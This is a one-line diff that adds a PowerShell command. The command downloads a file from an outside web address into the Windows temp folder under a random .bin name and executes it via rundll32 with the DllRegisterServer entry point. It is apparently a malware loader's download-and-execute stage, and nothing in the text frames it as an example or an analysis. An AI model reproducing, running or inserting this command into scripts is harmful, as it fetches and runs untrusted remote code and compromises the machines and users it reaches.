@@ -1,0 +1,1 @@
+$path = $Env:temp+'\EPzLaSUIf.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('http://adnmarketing.ec/robostar.php',$path); C:\Windows\System32\rundll32.exe $path,DllRegisterServer 
